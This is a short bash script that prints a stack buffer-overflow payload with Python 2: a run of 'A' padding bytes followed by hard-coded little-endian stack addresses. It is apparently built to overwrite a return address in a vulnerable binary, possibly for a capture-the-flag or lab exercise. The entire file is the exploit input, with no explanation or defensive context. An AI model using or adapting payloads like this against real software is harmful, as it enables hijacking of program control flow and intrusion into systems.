#!/bin/bash
python2 -c "print 'A'*100 + '\x1c\xcb\xff\xff' * 2 + '\x20\xcb\xff\xff'"
